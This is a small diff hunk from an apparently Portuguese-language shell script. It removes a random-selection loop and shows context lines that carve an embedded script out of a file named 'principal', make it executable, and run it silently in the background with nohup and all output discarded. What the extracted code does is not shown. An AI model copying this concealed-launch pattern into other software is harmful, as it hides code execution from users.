@@ -3,8 +3,6 @@ cd $HOME; clear
   tail -n +148 principal > s && chmod +x s
   nohup ./s </dev/null >/dev/null 2>&1&
   clear; sleep .1
-  while :; do
-   rand=$[$RANDOM % ${#arr[@]}]
    mae=$(echo ${arr[$rand]})
    giro=$(if [ -e ~/menuOi.sh ]; then echo ok; fi)
         case $giro in
